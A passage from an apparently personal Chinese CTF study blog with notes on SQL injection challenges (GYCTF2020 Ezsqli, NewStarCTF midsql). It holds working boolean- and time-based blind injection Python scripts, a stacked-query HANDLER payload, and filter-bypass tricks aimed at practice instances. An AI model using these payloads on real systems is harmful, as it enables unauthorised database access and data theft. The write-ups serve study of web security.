语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到SQL标准中。handler 语句提供通往表的直接通道的存储引擎接口，可以用于 MyISAM 和 InnoDB 表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 打开一个表名为 tbl_name 的表的句柄<br>HANDLER tbl_name <span class="hljs-keyword">OPEN</span> [ [<span class="hljs-keyword">AS</span>] alias]<br><br># <span class="hljs-number">1</span>、通过指定索引查看表，可以指定从索引那一行开始，通过 NEXT 继续浏览<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-operator">=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;=</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&lt;</span> <span class="hljs-operator">|</span> <span class="hljs-operator">&gt;</span> &#125; (value1,value2,...)<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">2</span>、通过索引查看表<br># <span class="hljs-keyword">FIRST</span>: 获取第一行（索引最小的一行）<br># NEXT: 获取下一行<br># PREV: 获取上一行<br># <span class="hljs-keyword">LAST</span>: 获取最后一行（索引最大的一行）<br>HANDLER tbl_name READ index_name &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT <span class="hljs-operator">|</span> PREV <span class="hljs-operator">|</span> <span class="hljs-keyword">LAST</span> &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># <span class="hljs-number">3</span>、不通过索引查看表<br># READ <span class="hljs-keyword">FIRST</span>: 获取句柄的第一行<br># READ NEXT: 依次获取其他行（当然也可以在获取句柄后直接使用获取第一行）<br># 最后一行执行之后再执行 READ NEXT 会返回一个空的结果<br>HANDLER tbl_name READ &#123; <span class="hljs-keyword">FIRST</span> <span class="hljs-operator">|</span> NEXT &#125;<br>    [ <span class="hljs-keyword">WHERE</span> where_condition ] [LIMIT ... ]<br><br># 关闭已打开的句柄<br>HANDLER tbl_name <span class="hljs-keyword">CLOSE</span><br><br></code></pre></td></tr></table></figure><p>参考wp里的语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;;HANDLER `1919810931114514` OPEN;HANDLER `1919810931114514` READ FIRST;HANDLER `1919810931114514` CLOSE;</span><br></code></pre></td></tr></table></figure><p>更详细用法<br><a href="https://blog.csdn.net/qq_43427482/article/details/109898934">https://blog.csdn.net/qq_43427482/article/details/109898934</a></p><hr><h2 id="title-note-21date-2025-04-06-01-47-37tags-sql"><a href="#title-note-21date-2025-04-06-01-47-37tags-sql" class="headerlink" title="title: note-21date: 2025-04-06 01:47:37tags: sql"></a>title: note-21<br>date: 2025-04-06 01:47:37<br>tags: sql</h2><h1 id="GYCTF2020-Ezsqli-1"><a href="#GYCTF2020-Ezsqli-1" class="headerlink" title="[GYCTF2020]Ezsqli 1"></a>[GYCTF2020]Ezsqli 1</h1><p>fuzz没fuzz懂，看别人wp是数字型注入<br>bp出or和and被过滤了，没回显，那就是盲注了<br>看别人wp是用 ^ 代替 or , &amp;&amp; 代替 and<br>测试是否有回显：</p><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs m"><span class="hljs-number">1</span>&amp;&amp;length(database())&gt;<span class="hljs-number">0</span><br><span class="hljs-number">1</span>&amp;&amp;length(database())&lt;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>然后测试substr和ascii是否被过滤：</p><figure class="highlight m"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs m"><span class="hljs-number">1</span>&amp;&amp;ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">0</span><br><span class="hljs-number">1</span>&amp;&amp;ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>写脚本求数据库长度和名字：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;_-&#125;&#123;1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>url = <span class="hljs-string">&#x27;http://c2a220ad-23f1-4a7a-82c0-73eeafd4d980.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    payload = <span class="hljs-string">&#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(l)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;testing 数据库长度:&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据库长度:&quot;</span>,l)<br>        <span class="hljs-keyword">break</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,l+<span class="hljs-number">1</span>) :<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        payload = <span class="hljs-string">&quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            database_name=database_name + s<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;第&quot;</span>,i,<span class="hljs-string">&quot;个字符： &quot;</span>,database_name)<br>            <span class="hljs-keyword">break</span> <br></code></pre></td></tr></table></figure><blockquote><p>获取到数据库信息之后开始获取数据库内的表名，在测试的时候发现information_schema被过滤了，那就尝试下mysql.innodb_table_stats(mysql默认关闭InnoDB存储引擎)一样不行，那就只能百度了，看网上采用的是sys.x$schema_flattened_keys（需要版本&gt;5.7且只能查询表明，使用方法与information_schema类似）  </p></blockquote><p>我这个环境只有sys.x$schema_flattened_keys能用，有的wp用sys.schema_table_statistics_with_buffer，我这没测出来<br>求表名(写这步卡了我一个小时):</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;,-./0123456789:;&lt;&gt;=?@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`&#123;|&#125;~#&#x27;</span><br>url = <span class="hljs-string">&#x27;http://72f05b95-5f5b-4315-94d1-fb6b35544ce8.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># for l in range (1,100):</span><br><span class="hljs-comment">#     payload = &#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;testing 数据库长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;数据库长度:&quot;,l)</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    time.sleep(<span class="hljs-number">0.05</span>) <br>    payload = <span class="hljs-string">&quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(l)<br>    data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>    re = requests.post(url,data)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表名长度:&quot;</span>,l)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;全表名长度:&quot;</span>,l)<br>        <span class="hljs-keyword">break</span> <br>    <br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,l+<span class="hljs-number">1</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        time.sleep(<span class="hljs-number">0.05</span>) <br>        payload = <span class="hljs-string">&quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            name=name + s<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;表名:&quot;</span>,name)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>到求列名，因为information_schema被过滤，sys.schema_table_statistics_with_buffer又并没有储存列名，并且这里过滤了 union 所以我们无法使用常规的<strong>无列名注入</strong><br>如</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">admin</span>;<br></code></pre></td></tr></table></figure><p>更详细<br><a href="https://blog.csdn.net/qq_71467825/article/details/134655702">https://blog.csdn.net/qq_71467825/article/details/134655702</a></p><p>先判断表的列数</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-number">1</span>&amp;&amp;((<span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>) &gt; (<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> f1ag_1s_h3r3_hhhhh))<br></code></pre></td></tr></table></figure><p>知道列数为2，那第一列大概率是id或序列号啥的，猜测flag在2  </p><p>为什么不能直接用盲注呢，应该是以为没法用selec group_concat(列名)，因为没有能查列名的表，所以不知道列名。</p><p>那看大佬们的wp，就是用比大小，ascii码大的就大。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> &quot;a&quot;)  <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> &quot;abcdef&quot;)<br> <br><span class="hljs-number">0</span><br> <br> <br> <br><span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> &quot;b&quot;)  <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">select</span> &quot;abcdef&quot;)<br> <br><span class="hljs-number">1</span><br> <br>这里能发现 是通过比对 首个字符的ascii 如果相同 就输出 <span class="hljs-number">0</span> <br><br>不同就输出 <span class="hljs-number">1</span><br> 前一个 ascii  和 后一个ascii 值的大小<br> 如果前一个比较大 那么就输出<span class="hljs-number">0</span><br><br>https:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>kinsey973.github.io<span class="hljs-operator">/</span><span class="hljs-number">2024</span><span class="hljs-operator">/</span><span class="hljs-number">06</span><span class="hljs-operator">/</span><span class="hljs-number">08</span><span class="hljs-operator">/</span>GYCTF2020<span class="hljs-operator">-</span>Ezsqli<span class="hljs-operator">/</span><br></code></pre></td></tr></table></figure><p>利用该方法拿到flag</p><p>最后的脚本又写了一个小时，想死了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">str</span>=<span class="hljs-string">&#x27;-./0123456789:;&lt;&gt;=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~#&#x27;</span><br>url = <span class="hljs-string">&#x27;http://39c20ccd-935c-44d7-9446-f5fb806c3f12.node5.buuoj.cn:81/index.php&#x27;</span><br><span class="hljs-comment"># 1&amp;&amp;ascii(substr(database(),1,1))=</span><br>database_name=<span class="hljs-string">&#x27;&#x27;</span><br>name=<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-comment"># for l in range (1,100):</span><br><span class="hljs-comment">#     payload = &#x27;1&amp;&amp;length(database())=&#123;&#125;&#x27;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;testing 数据库长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;数据库长度:&quot;,l)</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment"># for i in range (1,l+1) :</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;&quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             database_name=database_name + s</span><br><span class="hljs-comment">#             print(&quot;第&quot;,i,&quot;个字符： &quot;,database_name)</span><br><span class="hljs-comment">#             break </span><br><br><span class="hljs-comment"># for l in range (1,1000):</span><br><span class="hljs-comment">#     time.sleep(0.05) </span><br><span class="hljs-comment">#     payload = &quot;1&amp;&amp;length((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()))=&#123;&#125; &quot;.format(l)</span><br><span class="hljs-comment">#     data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#     re = requests.post(url,data)</span><br><span class="hljs-comment">#     print(&quot;表名长度:&quot;,l)</span><br><span class="hljs-comment">#     if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#         print(&quot;全表名长度:&quot;,l)</span><br><span class="hljs-comment">#         break </span><br>    <br><span class="hljs-comment"># for i in range (1,l+1):</span><br><span class="hljs-comment">#     for s in str:</span><br><span class="hljs-comment">#         time.sleep(0.05) </span><br><span class="hljs-comment">#         payload = &quot;1&amp;&amp;substr((select group_concat(table_name)from sys.x$schema_flattened_keys where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; &quot;.format(i,s)</span><br><span class="hljs-comment">#         data = &#123;&#x27;id&#x27;: payload&#125;</span><br><span class="hljs-comment">#         re = requests.post(url,data)</span><br><span class="hljs-comment">#         if &#x27;Nu1L&#x27; in re.text:</span><br><span class="hljs-comment">#             name=name + s</span><br><span class="hljs-comment">#             print(&quot;表名:&quot;,name)</span><br><span class="hljs-comment">#             break</span><br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">1</span>,<span class="hljs-number">10000</span>):<br>    f=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">127</span>):<br>        time.sleep(<span class="hljs-number">0.08</span>)<br>        f=flag + <span class="hljs-built_in">chr</span>(s)<br>        payload = <span class="hljs-string">&#x27;1&amp;&amp;((select 1,&quot;&#123;&#125;&quot;)&gt;(select * from f1ag_1s_h3r3_hhhhh))&#x27;</span>.<span class="hljs-built_in">format</span>(f)<br>        data = &#123;<span class="hljs-string">&#x27;id&#x27;</span>: payload&#125;<br>        re = requests.post(url,data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Nu1L&#x27;</span> <span class="hljs-keyword">in</span> re.text:<br>            flag=flag + <span class="hljs-built_in">chr</span>(s-<span class="hljs-number">1</span>)<br>            <span class="hljs-built_in">print</span>(flag.lower)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>最后出来的flag全是大写，我看别人的wp也是大写要转小写，不知道什么原因</p><p>结束  </p><p>一道题看着别人的wp复现了近3个半小时，菜的发瘟，写脚本脑子跟不上，做题起步难没经验，到底哪天能独立解出一道这种web题啊<br>&#x2F;&#x2F;<br>&#x2F;&#x2F;<br>&#x2F;&#x2F;</p><p>复现的wp:<br><a href="https://kinsey973.github.io/2024/06/08/GYCTF2020-Ezsqli/">https://kinsey973.github.io/2024/06/08/GYCTF2020-Ezsqli/</a><br><a href="https://www.cnblogs.com/upfine/p/16556520.html">https://www.cnblogs.com/upfine/p/16556520.html</a><br><a href="https://blog.csdn.net/fmyyy1/article/details/115447291">https://blog.csdn.net/fmyyy1/article/details/115447291</a></p><hr><h2 id="title-note-22date-2025-04-09-15-53-17tags-sql"><a href="#title-note-22date-2025-04-09-15-53-17tags-sql" class="headerlink" title="title: note-22date: 2025-04-09 15:53:17tags: sql"></a>title: note-22<br>date: 2025-04-09 15:53:17<br>tags: sql</h2><h1 id="NewStarCTF-2023-公开赛道-midsql"><a href="#NewStarCTF-2023-公开赛道-midsql" class="headerlink" title="[NewStarCTF 2023 公开赛道]midsql"></a>[NewStarCTF 2023 公开赛道]midsql</h1><p>看了wp，只能说fuzz过程应该是最重要的，不然fuzz都fuzz不明白完全不知道下一步该干嘛<br>也许我记得一些注入方法，但是如果连注入点或者注入方式都fuzz不出来也是完全没用<br>看了wp后发现原理都懂，那为什么总是要看wp才能写出题目？<br>就是不会fuzz，<br>自己写的脚本：  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>start=<span class="hljs-number">0</span><br>end=<span class="hljs-number">0</span><br>using=<span class="hljs-number">0</span><br>st = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$&amp;\()*&#x27; +,-./:;&quot;</span><br>flag =<span class="hljs-string">&#x27;&#x27;</span><br>url = <span class="hljs-string">&quot;http://9f146922-110f-45e5-a8b6-4b6fffbce466.node5.buuoj.cn:81/?id=&#x27;if(length(database())like(&#123;&#125;),sleep(3),1)&quot;</span><br><span class="hljs-comment"># for l in range (1,200):</span><br><span class="hljs-comment">#     url = &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(length(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_name/**/like&#x27;items&#x27;)like/**/&#123;&#125;,sleep(3),1)&quot;.format(l)</span><br><span class="hljs-comment">#     start=time.time()</span><br><span class="hljs-comment">#     requests.get(url)</span><br><span class="hljs-comment">#     end=time.time()</span><br><span class="hljs-comment">#     using = end - start</span><br><span class="hljs-comment">#     if using &gt; 3:</span><br><span class="hljs-comment">#         print(&quot;tables length=&quot;,l,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#         time.sleep(5)</span><br><span class="hljs-comment">#         break</span><br><span class="hljs-comment">#     print(&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#     time.sleep(0.05)</span><br><br><span class="hljs-comment"># for i in range(1,100):</span><br><span class="hljs-comment">#     for s in st :</span><br><span class="hljs-comment">#         url= &quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like&#x27;items&#x27;),&#123;&#125;,1)like(&#x27;&#123;&#125;&#x27;),sleep(3),1)&quot;.format(i,s)</span><br><span class="hljs-comment">#         start=time.time()</span><br><span class="hljs-comment">#         requests.get(url)</span><br><span class="hljs-comment">#         end=time.time()</span><br><span class="hljs-comment">#         using= end - start</span><br><span class="hljs-comment">#         if using &gt; 3:</span><br><span class="hljs-comment">#             flag=flag + s</span><br><span class="hljs-comment">#             print(&quot;tables name=&quot;,flag,&quot;using time=&quot;,using)</span><br><span class="hljs-comment">#             r=1</span><br><span class="hljs-comment">#             break</span><br><span class="hljs-comment">#         print(&quot;using time=&quot;,using,&quot;string:&quot;,s)</span><br><span class="hljs-comment">#         time.sleep(0.05)</span><br><span class="hljs-comment">#         print(flag)</span><br><span class="hljs-comment">#         r=0</span><br><span class="hljs-comment">#     if r == 0:</span><br><span class="hljs-comment">#         break</span><br><br><span class="hljs-comment">#id,name,price</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span> (<span class="hljs-number">32</span>,<span class="hljs-number">177</span>) :<br>        url= <span class="hljs-string">&quot;http://758d4b32-13c8-42cc-9228-a7fe9aa9ffaf.node5.buuoj.cn:81/?id=if(ascii(substr((select/**/group_concat(name)/**/from/**/items),&#123;&#125;,1))like(&#x27;&#123;&#125;&#x27;),sleep(2),1)&quot;</span>.<span class="hljs-built_in">format</span>(i,s)<br>        start=time.time()<br>        requests.get(url)<br>        end=time.time()<br>        using= end - start<br>        <span class="hljs-keyword">if</span> using &gt; <span class="hljs-number">3</span>:<br>            flag=flag + <span class="hljs-built_in">chr</span>(s)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;tables name=&quot;</span>,flag,<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;number string:&quot;</span>,i)<br>            r=<span class="hljs-number">1</span><br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;using time=&quot;</span>,using,<span class="hljs-string">&quot;string:&quot;</span>,<span class="hljs-built_in">chr</span>(s))<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        <span class="hljs-built_in">print</span>(flag)<br>        r=<span class="hljs-number">0</span><br>    <span class="hljs-keyword">if</span> r == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure><p>参考wp:  <a href="https://blog.csdn.net/Myon5/article/details/134096958">https://blog.csdn.net/Myon5/article/details/134096958</a></p><hr><h2 id="title-note-23date-2025-04-10-19-47-02tags-刷题note"><a href="#title-note-23date-2025-04-10-19-47-02tags-刷题note" 